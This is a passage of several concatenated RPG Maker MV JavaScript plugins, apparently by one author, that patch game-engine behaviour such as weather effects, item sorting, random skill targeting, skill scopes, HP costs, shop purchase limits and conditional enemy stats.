p.setupWind1,
p.setupWind2,
p.setupWind3,
p.setupSpark1,
p.setupSpark2,
p.setupSpark3,
p.setupFire1,
p.setupFire2,
p.setupFire3,
p.setupSnow1,
p.setupSnow2,
p.setupSnow3,
p.setupRain1,
p.setupRain2,
p.setupRain3,
p.setupCloud1,
p.setupCloud2,
p.setupCloud3,
p.setupRandom1,
p.setupRandom2,
p.setupRandom3,
p.setupSunLight1,
p.setupFog1,
p.setupFog2,
p.setupFog3,
p.setupStar1,
p.setupStar2,
p.setupShinning,
p.setupBounce,
p.setupSpark4,
p.setupBubble,
p.setupStandStill,
p.setupFogXP1,
p.setupFogXP2,
p.setupParallax1,
p.setupParallax2,
];
t._undef=p.setupRandom3;

k='needUpdatePosition';
r=p[k]; (p[k]=function f(){
	return !f.tbl.has(this.mode());
}).ori=r;
p[k].tbl=new Set([28,31,32,33,34,35,]);

k='setFrontalCamera';
r=p[k]; (p[k]=function f(){
	this._cam[3] = this._cam[0] = Graphics.boxWidth  >>1;
	this._cam[4] = this._cam[1] = Graphics.boxHeight >>1;
}).ori=r;

}

})();


﻿"use strict";
/*:
 * @plugindesc 修 MOG_Weather_EX.js randomPosX, randomPosY 值域非常奇怪ㄉ問題
 * @author agold404
 * @help ㄇㄉ87
 *
 * note: _cam[]: see setFrontalCamera
 * 0,3 = Graphics.boxWidth/2
 * 1,4 = Graphics.boxHeight/2
 * 
 * This plugin can be renamed as you want.
 */

if('undefined'!==typeof SpriteWeatherEX)(()=>{ let k,r,t;

t=[];
t._initFunc=function(){
	const g=Graphics;
	this.push(Math.max(g.boxWidth,g.boxHeight));
	this.push(this[0]>>1,this[0]<<1);
};

cf(cf(SpriteWeatherEX.prototype,'randomPosX',function f(sp){
	if(!f.tbl.length) t._initFunc();
	sp._realX=-f.tbl[1]+Math.random()*f.tbl[2]+this.screenX();
	// sp._realX=Math.random()*f.tbl[0]+this.screenX(); // debug
	// window._isMyFunc=true; // debug
},t),'randomPosY',function f(sp){
	if(!f.tbl.length) t._initFunc();
	sp._realY=-f.tbl[1]+Math.random()*f.tbl[2]+this.screenY();
	// sp._realY=Math.random()*f.tbl[0]+this.screenY(); // debug
	// window._isMyFunc=true; // debug
},t);

})();


﻿"use strict";
/*:
 * @plugindesc 自訂選單中道具清單排序依據的數字，而非使用id。預設是使用id。
 * @author agold404
 * @help <sortingKey:數字>
 * 排序依然是小到大
 *
 * MOG可以再87一點沒關係ㄛ。與原版一模一樣ㄉcode直接貼過去不用物件繼承是怎樣？
 * bad bad bad MOG. copy and paste instead of inheriting, on the 100% same code.
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl=[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	if(meta.sortingKey) dataobj.sortingKey=meta.sortingKey-0;
},
];
}

{ const p=DataManager;
k='getDataObjSortingKey';
r=p[k]; (p[k]=function f(dataobj){
	return dataobj&&(dataobj.sortingKey===undefined?dataobj.id:dataobj.sortingKey);
}).ori=r;
k='sortDataObjList';
r=p[k]; (p[k]=function f(arr){
	return arr.sort(f.tbl[0]);
}).ori=r;
p[k].tbl=[
(a,b)=>DataManager.getDataObjSortingKey(a)-DataManager.getDataObjSortingKey(b)||a.id-b.id,
];
}

{ const p=Window_ItemList.prototype;
k='makeItemList';
r=p[k]; (t=p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	const arr=this._data,incNull=this.includes(null);
	if(incNull) arr.pop();
	DataManager.sortDataObjList(arr);
	this._onTopEndIdx=0;
	if(incNull) arr.push(null);
	return rtv;
}).ori=r;
}

//if(typeof Window_ItemListM!=='undefined'){ const p=Window_ItemListM.prototype; p[k]=t; }

})();


﻿"use strict";
/*:
 * @plugindesc this plugin makes random target skills be able to select target(s) by some clue
 * @author agold404
 * @help in skill/item note:
 * 
 * make selection not weight by target rate:
 *
 * <rndSelWeights:{"isPriority":true_or_false,"attribute1":weight1,"attribute2":weight2, ... , "script":script_text }>
 * 
 * json format
 * "isPriority", all attributes and "script" are optional
 * 
 * "isPriority":
 * If it is a true-like value, it will make target selection determined by highest weighted sum.
 * 
 * weighted sum:
 * sum of all values of attribute*weight + script
 * 
 * value of attributes*weights:
 * will be cap to between 0 (included) and Infinity
 * When the weighted sum is 0, do uniformly random
 * If attribute returns a function, the called return value is used to multiply the weight.
 * 
 * 
 * 
 * technical detail:
 * above user setting values are inititialized right before Scene_Boot.start
 * 
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataSkills.forEach(f.forEach);
	$dataItems.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	if(dataobj.meta.rndSelWeights){
		const j=JSON.parse(dataobj.meta.rndSelWeights);
		const rsw=dataobj.rndSelWeights={attrs:[],};
		for(let k in j) if(k!=='isPriority' && k!=='script') rsw.attrs.push([k,j[k]]);
		rsw.isPriority=!!j.isPriority;
		rsw.script=j.script;
	}
};
}

{ const p=Game_Battler.prototype;
p.evalSelWeight=function(setting,options,act){
	if(options && options.useTgr) return this.tgr;
	let rtv=0;
	if(setting.script){
		rtv+=eval(setting.script);
	}
	for(let x=0,arr=setting.attrs;x!==arr.length;++x){
		let v=this[arr[x][0]];
		if(v && v.constructor===Function) v=v.call(this);
		rtv+=v*arr[x][1];
	}
	return rtv;
};
}

{ const p=Game_Unit.prototype;
p.selectRandomTargetFrom=(arr,setting,options,act)=>{
	let sum=0,isRnd=false,res=[];
	options=options||{};
	if(!setting) options.useTgr=isRnd=true;
	else if(!setting.isPriority) isRnd=true;
	let maxVal=-Infinity,maxValIdxv=[];
	for(let x=0,w;x!==arr.length;++x){
		w=arr[x].evalSelWeight(setting,options,act);
		if(isRnd) w=w>=0?w:0;
		if(w>=maxVal){
			if(maxVal!==w){
				maxVal=w;
				maxValIdxv.length=0;
			}
			maxValIdxv.push(x);
		}
		res.push([w,arr[x]]);
		sum+=w;
	}
	if(!isRnd && maxValIdxv.length) return arr[maxValIdxv.rnd1()];
	if(!sum) return arr.rnd1();
	sum*=Math.random();
	for(let x=0;x!==res.length;++x) if(0>=(sum-=res[x][0])) return res[x][1];
	return null;
};
k='randomTarget';
r=p[k]; (p[k]=function f(act,options){
	const item=act&&act.item();
	return this.selectRandomTargetFrom(options&&options.ignoreIfDead?this.members():this.aliveMembers(),item&&item.rndSelWeights,options,act);
}).ori=r;
k='randomDeadTarget';
r=p[k]; (p[k]=function f(act,options){
	const item=act&&act.item();
	return this.selectRandomTargetFrom(options&&options.ignoreIfDead?this.members():this.deadMembers(),item&&item.rndSelWeights,options,act);
//	const members=options.ignoreIfDead?this.members():this.deadMembers();
//	if(!members.length) return null;
//	return members[Math.floor(Math.random() * members.length)];
}).ori=r;
}

{ const p=Game_Action.prototype;
k='decideRandomTarget';
r=p[k]; (p[k]=function f(options){
	let target;
	if(this.isForDeadFriend()) target = this.friendsUnit().randomDeadTarget(this,options);
	else if(this.isForFriend()) target = this.friendsUnit().randomTarget(this,options);
	else target = this.opponentsUnit().randomTarget(this,options);
	if(target) this._targetIndex = target.index();
	else this.clear();
}).ori=r;
k='confusionTarget';
r=p[k]; (p[k]=function f(options){
	switch (this.subject().confusionLevel()) {
	case 1:
		return this.opponentsUnit().randomTarget(this,options);
	case 2:
		return (Math.random()<0.5?this.opponentsUnit():this.friendsUnit()).randomTarget(this,options);
	default:
		return this.friendsUnit().randomTarget(this,options);
	}
}).ori=r;
k='targetsForOpponents';
r=p[k]; (p[k]=function f(options){
	let targets = [];
	const unit = this.opponentsUnit();
	if(this.isForRandom()) for(let i=0,sz=this.numTargets();i!==sz;++i) targets.push(unit.randomTarget(this,options));
	else if(this.isForOne()){
		if(this._targetIndex<0) targets.push(unit.randomTarget(this,options));
		else targets.push(unit.smoothTarget(this._targetIndex));
	}else targets = unit.aliveMembers();
	return targets;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc This plugin extends scope of skills and items so there'll be a type: forAllFriends, ignoreIfDead
 * @author agold404
 *
 * @help 本插件提供：可調整技能及道具，使其對全體隊友不論是否死亡皆有效，另外如果強制對死亡玩家
 * 備註: 基底code包含，若玩家HP>=1，會自動解除死亡狀態，故使用此功能對全隊(含死者)補血，即使不解除死亡狀態，也可以復活死亡玩家
 * 本插件沒有參數，可隨意命名。
 * 使用方法：在欲使用的技能貨道具之note區中，輸入 <forAllFriends>
 *
 * ignoreIfDead: 不做角色是否為死亡的跳過判斷
 */

// addScope_forAllFriends

(_=>{ let k,r,t;
const kw='forAllFriends',kw2='ignoreIfDead';

{ const p=Set.prototype;
p.contains=p.has;
}

const a=Game_Action;
a.TARGET_ENUM_MAX=12;
a.TARGET_ENUM_forAllFriends=12;
a.TARGET_SET_isForFriend=new Set([ 7, 8, 9, 10, 11, a.TARGET_ENUM_forAllFriends ]);
a.TARGET_SET_isForAll=new Set([ 2, 8, 10, a.TARGET_ENUM_forAllFriends ]);
a.TARGET_SET_isForDeadFriend_ONLY=new Set([ 9, 10, ]);

{ const p=Scene_Boot.prototype,k='start';
const r=p[k],tune=s=>s&&s.meta[kw]&&(s.scope=a.TARGET_ENUM_forAllFriends);
(p[k]=function f(){
	f.ori.apply(this,arguments);
	$dataSkills.forEach(tune);
	$dataItems.forEach(tune);
}).ori=r;
}

{ const p=a.prototype; let r,k,d;
// new
p.is_ignoreIfDead=function(){ return this.item().meta[kw2] || this.isForAllFriend(); };
p.isForAllFriend=function(){ return this.item().scope===a.TARGET_ENUM_forAllFriends };
p.isForDeadFriend_only=function(){ return this.checkItemScope(a.TARGET_SET_isForDeadFriend_ONLY); };
// overwrite
k='isForFriend';
r=p[k]; (p[k]=function(){ return this.checkItemScope(a.TARGET_SET_isForFriend); }).ori=r;
k='isForAll';
r=p[k]; (p[k]=function(){ return this.checkItemScope(a.TARGET_SET_isForAll); }).ori=r;
k='testApply';
r=p[k]; (p[k]=function f(target){
	return (
		( this.is_ignoreIfDead() || this.isForDeadFriend() === target.isDead() ) && // effect to deads only on friends
		(
			$gameParty.inBattle() || this.isForOpponent() ||
			(this.isHpRecover() && target.hp < target.mhp) ||
			(this.isMpRecover() && target.mp < target.mmp) ||
			this.hasItemAnyValidEffects(target)
		)
	);
}).ori=r;
// hook
k='decideRandomTarget';
r=p[k]; (p[k]=function f(){
	f.tbl[kw2]=this.is_ignoreIfDead();
	return f.ori.call(this,f.tbl);
//	if(this.isForAllFriend()){
//		const u=this.friendsUnit();
//		let tgrRnd=Math.random() * this.tgrSum() , target;
//		for(let x=0,mem=u.members();x!==mem.length;++x){
//			tgrRnd-=mem[x].tgr;
//			if(tgrRnd<=0){ target=mem[x]; break; }
//		}
//		if(target) this._targetIndex = target.index();
//		else this.clear();
//	}else return f.ori.apply(this,arguments);
}).ori=r;
p[k].tbl={};
k='targetsForFriends';
r=p[k];
(p[k]=function f(){
	if(!f.tbl._sorted){
		f.tbl._sorted=true;
		f.tbl.sort(f.cmp);
	}
	for(let x=0,unit=this.friendsUnit();x!==f.tbl.length;++x) if(f.tbl[x][1].call(this)) return f.tbl[x][2].call(this,unit);
	return [];
}).ori=r;
p[k].tbl=[
// sorting order, cond., getList
[2,function(){ return this.isForUser(); },function(unit){
	return [this.subject()];
}],
[4,function(){ return this.isForAll(); },function(unit){
	if(this.is_ignoreIfDead()) return unit.members();
	else{
		if(this.isForDeadFriend_only()) return unit.deadMembers();
		else return unit.aliveMembers();
	}
}],
[6,function(){ return this.isForOne(); },function(unit){
	if(this._targetIndex<0) return [unit.randomTarget()];
	if(this.is_ignoreIfDead()) return [unit.smoothTarget(this._targetIndex,true)];
	else{
		if(this.isForDeadFriend_only()) return [unit.smoothDeadTarget(this._targetIndex)];
		else return [unit.smoothTarget(this._targetIndex)];
	}
}],
[65535,()=>true,function(unit){
	// default
	return unit.aliveMembers();
}],
];
p[k].cmp=(a,b)=>a[0]-b[0];
k='itemTargetCandidates';
r=p[k]; (p[k]=function f(){
	if(!this.isValid()) return [];
	if(this.isForUser()) return [this.subject()];
	if(this.is_ignoreIfDead()){
		return this.isForOpponent()?
			this.opponentsUnit().members():
			this.friendsUnit().members();
	}else{
		if(this.isForOpponent()) return this.opponentsUnit().aliveMembers();
		return this.isForDeadFriend_only()?
			this.friendsUnit().deadMembers():
			this.friendsUnit().aliveMembers();
	}
	// return this.isForAllFriend() ? ( this.isValid() ? this.friendsUnit().members() : [] ) : f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Unit.prototype;
k='smoothTarget';
r=p[k]; (p[k]=function(index,ignoreIfDead){ 
	if(!(index>=0)) index=0;
	const members=this.members();
	let member=members[index];
	for(let x=0,xs=members.length<<1;x!==xs;){
		++x;
		member=members[index+((x&1)?(x>>1):-(x>>1))];
		if(member && (ignoreIfDead||member.isAlive())) return member;
	}
	return this.aliveMembers()[0];
}).ori=r;
k='smoothDeadTarget';
r=p[k]; (p[k]=function(index,ignoreIfDead){
	if(!(index>=0)) index=0;
	const members=this.members();
	let member=members[index];
	for(let x=0,xs=members.length<<1;x!==xs;){
		++x;
		member=members[index+((x&1)?(x>>1):-(x>>1))];
		if(member && (ignoreIfDead||member.isDead())) return member;
	}
	return this.deadMembers()[0];
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 內建的永遠不夠用，都給我寫就就飽了
 * @author agold404
 * 
 * @help 目前功能
 * 
 * 增加倍率參數
 * 
 */

// agold404__Game_Action

// main
(()=>{ const p=Game_Action.prototype; let k,r;

k='initialize';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	this._dmgRate=1;
}).ori=r;

k='evalDamageFormula';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	return Math.round(rtv*this._dmgRate);
}).ori=r;

p.setDmgRate=function(n){ this._dmgRate=n; };

})();
// END main


// BattleManager
(()=>{ const p=BattleManager;

p.setDmgRate=function(n){ if(this._action) this._action.setDmgRate(n); };

})();
// END BattleManager


﻿"use strict";
/*:
 * @plugindesc 讓事件可以只穿透事件而不穿透玩家、可在note區設定一事件是否不因離畫面太遠而不行動
 * @author agold404
 *
 * @help this plugin contains 2 functions
 * 
 * 1.
 * this plugin let you set events through only events but not player (and followers)
 * 
 * syntax: write <throughEvents> in note of a event
 * this will let the event can be through all events
 * 
 * syntax: write <throughEventsOnly:A_USER_DEFINED_STRING> in note of a event
 * this will let the event can be through all events having same 'meta.throughEventsOnly' (leave it empty can be a classification) in notes only
 * 
 * remember to uncheck "through"
 *
 *
 * 2.
 * this plugin let you set an event to be always self-movable no matter how far it is to the screen and the player
 *
 * syntax: <longDistDetection>
 *
 * Actual Example:
 * <longDistDetection>
 *
 *
 * This plugin can be renamed as you want.
 */

// eventThroughEvents

(()=>{
{ const p=Game_Event.prototype , k='isCollidedWithEvents' , k1='throughEvents' , k2='throughEventsOnly' , h=Object.hasOwnProperty;
const r=p[k]; (p[k]=function(x,y){
	const meta=this.event().meta;
	if(h.call(meta,k1)) return false;
	else if(h.call(meta,k2)) return $gameMap.eventsXy(x,y).some(e=>e&&!e._through&&meta[k2]!==e.event().meta[k2]);
	else return $gameMap.eventsXyNt(x,y).length;
}).ori=r;
}
})();

(()=>{
{ const p=Game_Event.prototype,h=Object.hasOwnProperty;
{const k='isNearTheScreen',k1='longDistDetection';
const r=p[k]; (p[k]=function f(){
	return h.call(this.event().meta,k1)||f.ori.apply(this,arguments);
}).ori=r;
}
{const k='isNearThePlayer',k1='longDistDetection';
const r=p[k]; (p[k]=function f(){
	return h.call(this.event().meta,k1)||f.ori.apply(this,arguments);
}).ori=r;
}
}
})();


﻿"use strict";
/*:
 * @plugindesc 讓Irina_ActionCutins可選擇在戰鬥中在cuting時讓spriteset變更暗
 * @author agold404
 *
 * @help 在skill的note中出現 <action cutin> 及 <darkenCutin> 即可讓此技能在戰鬥中在cuting時，讓spriteset變暗
 * 
 * This plugin can be renamed as you want.
 */

// extend__Irina_ActionCutins__darkenSpriteset

if(typeof $actionCutin!=='undefined')(()=>{
$actionCutin._spritesetTone_setDark=0;
$actionCutin._spritesetTone_setMaxCount=1;
$actionCutin._spritesetTone=undefined;
$actionCutin._spritesetTone_remainCount=0;
if(1){ // dev-ing test
$actionCutin._spritesetTone_setDark=127;
$actionCutin._spritesetTone_setMaxCount=15;
}
Spriteset_Battle.prototype.updateToneChanger=function(){
	if($actionCutin._spritesetTone_remainCount>0){
		const b=$gameScreen.tone();
		for(let x=0,arr=$actionCutin._spritesetTone,
			mc=$actionCutin._spritesetTone_setMaxCount,
			c=$actionCutin._spritesetTone_remainCount,
			d=-$actionCutin._spritesetTone_setDark;x!=4;++x)
		{
			arr[x]=(b[x]*(mc-c)+d*c)/mc;
		}
		--$actionCutin._spritesetTone_remainCount;
	}
	else $actionCutin._spritesetTone=undefined;
	const tone = $actionCutin._spritesetTone?$actionCutin._spritesetTone:$gameScreen.tone();
	if(!this._tone.equals(tone)){
		this._tone = tone.clone();
		if(Graphics.isWebGL()) this.updateWebGLToneChanger();
		else this.updateCanvasToneChanger();
	}
};
{ const p=TilingSprite_ActionCutin.prototype , k='updateOpacity';
const r=p[k];
(p[k]=function f(){
	f.ori.apply(this,arguments);
	if(this._duration > 0 && this._settings.darken){
		if(!$actionCutin._spritesetTone){
			const d=$actionCutin._spritesetTone_setDark;
			$actionCutin._spritesetTone=[-d,-d,-d,0];
		}
		$actionCutin._spritesetTone_remainCount=$actionCutin._spritesetTone_setMaxCount;
	}
}).ori=r;
}
{ const p=Imported.Irina_ActionCutins , k='updateSettingsToItem';
const r=p[k];
(p[k]=function f(item, settings){
	f.ori.apply(this,arguments);
	if(item) settings.darken=item.meta.darkenCutin;
}).ori=r;
}
})();


﻿"use strict";
/*:
 * @plugindesc change comma-merging behaviour in YEP eval
 * @author agold404
 *
 * @help 不要亂把逗號加上空白再合併好ㄇ
 * 不要相信豬隊友說沒有直接執行JS的功能
 * 
 */

// refine YEP_BattleEngineCore actionEval

(()=>{
new cfc(BattleManager).add('processActionSequence',function f(k,arg){
	if(k==='EVAL'){
		this.processActionSequence_anotherEval(arg);
		return true;
	}
	return f.ori.apply(this,arguments);
}).add('processActionSequence_anotherEval',function f(arg){
	return f.tbl[0](this._subject,arg.join(','),this._targets,this._action);
},[
(self,t,bs,act)=>{
	const a=self,user=a,subject=a;
	const target=bs[0],targets=bs;
	const action=act,gameItem=act._item,item=act.item();
	const text=t,txt=t;
	try{
		return eval(t);
	}catch(e){
		console.warn(txt);
		e.message+="\n\n EVAL:\n"+txt;
		e.name+=" in action sequence of "+gameItem._dataClass+" "+gameItem._id;
		throw e;
	}
}, // 0: eval
]);
})();


"use strict";

// fixBtlHudBug_castMaxAt

(()=>{ let k,r;
if(typeof Battle_Hud!=='undefined' && typeof Imported!=='undefined'){ const p=Battle_Hud.prototype;
k='cast_max_at';
r=p[k]; (p[k]=function f(){
	return Imported.YEP_X_BattleSysATB&&!BattleManager.isBattleEnd()?this._battler.atbChargeDenom():f.ori.apply(this,arguments);
}).ori=r;
}
})();


﻿"use strict";
/*:
 * @plugindesc This plugin provides UI visibility management in battle
 * @author agold404
 *
 * @help 本插件提供：在戰鬥時調整UI是否可見，儲存當前顯示狀態等等
 * 會輸出 window.uiVisMgr ，以下函式都掛在這個物件上。
 * 使用中途改變 SceneManager._scene 的 children 時此插件可能會失靈。
 * 戰鬥結束後，以儲存的狀態並不會重置，請自行管理。
 * 此插件不會檢查是否為戰鬥狀態。
 * 
 * 函式：
 * getStack: 把stack給你
 * push: 將當前UI顯示狀態推進stack
 * pop: 將上次最後推進stack的UI狀態拿出來並套用
 * hide: 全部藏起來
 * pushAndHide: 先push + 再hide
 */

// hideUiInBattle

window.uiVisMgr=(()=>{
const rtv={},stk=[];

rtv.getStack=()=>stk;
rtv.push=()=>stk.push(SceneManager._scene.children.map(x=>x.visible));
rtv.pop=()=>{
	const s=stk.pop(); if(!s) return;
	SceneManager._scene.children.forEach((x,i)=>x&&x.constructor!==Spriteset_Battle&&(x.visible=s[i]));
};
rtv.hide=()=>SceneManager._scene.children.forEach(x=>x&&x.constructor!==Spriteset_Battle&&(x.visible=false));
rtv.pushAndHide=()=>{
	rtv.push();
	rtv.hide();
};

return rtv;
})();


"use strict";
/*:
 * @plugindesc timer pause
 * @author agold404
 *
 * @help 新增 $gameTimer.pause , $gameTimer.resume 來暫停、恢復計時的同時，仍會將數字顯示在畫面上。
 * 
 * This plugin can be renamed as you want.
 */

// timerPause

(()=>{
const p=Game_Timer.prototype;
{const k='initialize';
const r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	this._paused=0;
}).ori=r;
}
{const k='update';
const r=p[k]; (p[k]=function f(){
	return this._paused||f.ori.apply(this,arguments);
}).ori=r;
}
p.pause=function(){ this._paused=1; };
p.resume=function(){ this._paused=0; };
})();


"use strict";

// tune__Irina_ActionCutins

(()=>{

{ const p=Game_Battler.prototype;
p.getActionCutinFaceData_byTIE=function(t,i,e){
	// try e then i
	if (e.match(/<Action Cutin Picture: (.*)>/i) || i.match(/<Action Cutin Picture: (.*)>/i)) {
		t.faceName = String(RegExp.$1);
		t.faceMode = "picture";
		t.faceIndex = 0
	} else if (e.match(/<Action Cutin Face: (.*),[ ](\d+)>/i) || i.match(/<Action Cutin Face: (.*),[ ](\d+)>/i)) {
		t.faceName = String(RegExp.$1);
		t.faceMode = "face";
		t.faceIndex = Number(RegExp.$2);
		if (t.faceName.match(/\[BUST\]/i)) {
			t.faceMode = "facebust";
			t.faceIndex = 0
		}
	} else if (e.match(/<Action Cutin SV: (.*),[ ](\d+)>/i) || i.match(/<Action Cutin SV: (.*),[ ](\d+)>/i)) {
		t.faceName = String(RegExp.$1);
		t.faceMode = "svbattler";
		t.faceIndex = Number(RegExp.$2)
	} else if (e.match(/<Action Cutin Battler: (.*),[ ](\d+)>/i) || i.match(/<Action Cutin Battler: (.*),[ ](\d+)>/i)) {
		t.faceName = String(RegExp.$1);
		t.faceMode = "battler";
		t.faceHue = Number(RegExp.$2)
	} else if (e.match(/<Action Cutin Battler: (.*)>/i) || i.match(/<Action Cutin Battler: (.*)>/i)) {
		t.faceName = String(RegExp.$1);
		t.faceMode = "battler";
		t.faceHue = 0
	}
	if (e.match(/<Action Cutin Scale: (.*)>/i) || i.match(/<Action Cutin Scale: (.*)>/i)) {
		t.faceScale = Number(RegExp.$1) || 1
	}
	if (e.match(/<Action Cutin Offset X: (.*)>/i) || i.match(/<Action Cutin Offset X: (.*)>/i)) {
		t.offsetX = Number(RegExp.$1)
	}
	if (e.match(/<Action Cutin Offset Y: (.*)>/i) || i.match(/<Action Cutin Offset Y: (.*)>/i)) {
		t.offsetY = Number(RegExp.$1)
	}
	if (e.match(/<Action Cutin Anti-Alias>/i) || i.match(/<Action Cutin Anti-Alias>/i)) {
		t.antialias = true
	} else if (e.match(/<Action Cutin No Anti-Alias>/i) || i.match(/<Action Cutin No Anti-Alias>/i)) {
		t.antialias = false
	}
};
p.getActionCutinFaceData=function(){
	if (this._actionCutinFaceData !== undefined)
		return this._actionCutinFaceData;
	var t = {
		faceName: this.isActor() ? this.faceName() : this.battlerName(),
		faceMode: this.isActor() ? "face" : "battler",
		faceIndex: this.isActor() ? this.faceIndex() : 0,
		faceHue: this.isActor() ? 0 : this.battlerHue(),
		faceScale: "auto",
		offsetX: 0,
		offsetY: 0,
		antialias: Imported.Irina_ActionCutins.defaultFaceAntiAlias
	};
	if (Imported.KELYEP_DragonBones && this.isEnemy() && this.isReplacedByDragonBonesBattler()) {
		t.faceName = dragonBonesIntegration.Game_Enemy_battlerName.call(this)
	}
	var e = this.isActor() ? this.actor().note : this.enemy().note;
	var i = this.isActor() ? this.currentClass().note : this.enemy().note;
	this.getActionCutinFaceData_byTIE(t,i,e);
	const act=this.currentAction();
	const item=act&&act.item();
	if(item) this.getActionCutinFaceData_byTIE(t,item.note,i);
	return t
};
}

})();


﻿"use strict";
/*:
 * @plugindesc This plugin makes limiting the number of a group of items possible
 * @author agold404
 *
 * @help 有時你希望商店裡的某幾項東西"總共"只能買幾個，那麼你可以使用這個插件
 * 用法：
 * 1. 先在 道具/武器/防具 的note區寫下 <maxStack:數字> 以限制該 道具/武器/防具 的最大數量。0或NaN時會使用預設值
 * 2. 再於 道具/武器/防具 的note區寫下 <unionCnt:[ [種類,id] , [種類,id] , ... ]> (format:JSON), 種類 可以是 "i" , "w" , "a" ，分別表示 道具、武器、防具。格式不符時會發生不可預期之錯誤。
 * 
 * 範例：希望 道具1,武器2,防具4,武器8 這4項總共只能購買3個，則
 * 於 道具1,武器2,防具4,武器8 的note區都寫下 <maxStack:3> <unionCnt:[["i",1],["w",2],["a",4],["w",8]]>
 * 
 * Technical detail:
 * 1. This plugin can be renamed as you want.
 * 2. This plugin use 'Game_Party.prototype.numItems' frequently when needed.
 */

// unionMaxBuy

(()=>{ const s='maxStack',u='unionCnt';
let r,d;

Scene_Shop.prototype.maxBuy=function f(){ // overwrite
	const max=$gameParty.maxItems(this._item)-$gameParty.unionCnt(this._item);
	const price=this.buyingPrice();
	return price>0 ? parseInt(Math.min((this.money() / price),max)) : max;
};

{ const p=Game_Party.prototype , h=Object.hasOwnProperty;
{ const k='maxItems';
r=p[k]; (p[k]=function f(o){
	if(!h.call(o,s)) o[s] = o.meta && h.call(o.meta,s) ? Number(o.meta[s])||f.ori.apply(this,arguments) : f.ori.apply(this,arguments);
	return o[s];
}).ori=r;
}
p.hasMaxItems=function f(o){ // overwrite
	return this.unionCnt(o) >= this.maxItems(o);
};
p.unionCnt=function(o){
	if(o.meta && Object.hasOwnProperty.call(o.meta,u)){
		if(!Object.hasOwnProperty.call(o,u)) o[u]=JSON.parse(o.meta[u]);
		let cnt=0;
		for(let x=0,arr=o[u],c;x!==arr.length;++x){
			switch(arr[x][0]){
			default: c=0; break;
			case 'a': c=$dataArmors; break;
			case 'i': c=$dataItems; break;
			case 'w': c=$dataWeapons; break;
			}
			if(c) cnt+=this.numItems(c[arr[x][1]]);
		}
		return cnt;
	}else return this.numItems(o);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc 技能可設定消耗HP
 * @author agold404
 *
 * @help in note: <hpCost:123>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r; 

{ const p=Scene_Boot.prototype,k='start';
const r=p[k],tune=s=>{ if(!s) return;
	const meta=s.meta;
	s.hpCost=Number(meta.hpCost)||0;
	if(meta.mpCost!==undefined) s.mpCost=Number(meta.mpCost)||0;
	if(meta.tpCost!==undefined) s.tpCost=Number(meta.tpCost)||0;
};
(p[k]=function f(){
	$dataSkills.forEach(tune);
	f.ori.apply(this,arguments);
}).ori=r;
}

{ const p=Game_BattlerBase.prototype;
p.skillHpCost=function(skill){
	return Math.floor(skill.hpCost)||0;
};
k='canPaySkillCost';
r=p[k]; (p[k]=function f(skill){
	return (this._hp>this.skillHpCost(skill)||this.isStateResist(1))&&f.ori.apply(this,arguments);
}).ori=r;
k='paySkillCost';
r=p[k]; (p[k]=function f(skill){
	this._hp -= this.skillHpCost(skill);
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 條件型怪物基礎數值
 * @author agold404
 *
 * @help 寫怪物note區
 * <alter:{"cond":switch_id_on,"atk":數字,"mat":數字,"def":數字,"mdf":數字,"agi":數字,"luk":數字,"hp":數字,"mp":數字}>
 * <addcond:{"switches":[switch_id_on,switch_id_on,switch_id_on,...],"lines":[數字,數字,數字,...]}>
 * <alter>可缺項
 *
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r; 
{ const p=Game_Enemy.prototype;
(p._genAlterParamPlus=function f(enemyId){
	const dataObj=$dataEnemies[enemyId];
	if(dataObj.meta.alter){
		if(!dataObj.alterParamPlus){
			const app=dataObj.alterParamPlus=[];
			const j=JSON.parse(dataObj.meta.alter);
			app.cond=j.cond;
			for(let x=0,arr=f.tbl;x!==arr.length;++x){
				if(isNaN(j[arr[x]])) app[x]=0;
				else app[x]=j[arr[x]]-dataObj.params[x];
			}
		}
		const app=dataObj.alterParamPlus;
		if($gameSwitches.value(app.cond)){
			const arr=this._paramPlus;
			for(let x=0,xs=Math.min(app.length,arr.length);x!==xs;++x) arr[x]=app[x];
		}
	}else dataObj.meta.alter=undefined;
}).tbl=["hp","mp","atk","def","mat","mdf","agi","luk",];
p._genAddcond=function(enemyId){
	const dataObj=$dataEnemies[enemyId];
	if(!dataObj.addcond) dataObj.addcond=[];
	if(dataObj.meta.addcond){
		const j=JSON.parse(dataObj.meta.addcond),ac=dataObj.addcond;
		for(let x=0;x!==j.lines.length;++x) ac[j.lines[x]]=j.switches[x];
	}else dataObj.meta.addcond=undefined;
};
p._genActionMap=function(){
	const actions=this.enemy().actions;
	if(!actions.m) actions.m=new Map(actions.map((x,i)=>[x,i]));
};
k='setup';
r=p[k]; (p[k]=function f(enemyId){
	this._genAlterParamPlus(enemyId);
	this._genAddcond(enemyId);
	return f.ori.apply(this,arguments);
}).ori=r;
k='makeActions';
r=p[k]; (p[k]=function f(){
	this._genActionMap();
	return f.ori.apply(this,arguments);
}).ori=r;
k='isActionValid';
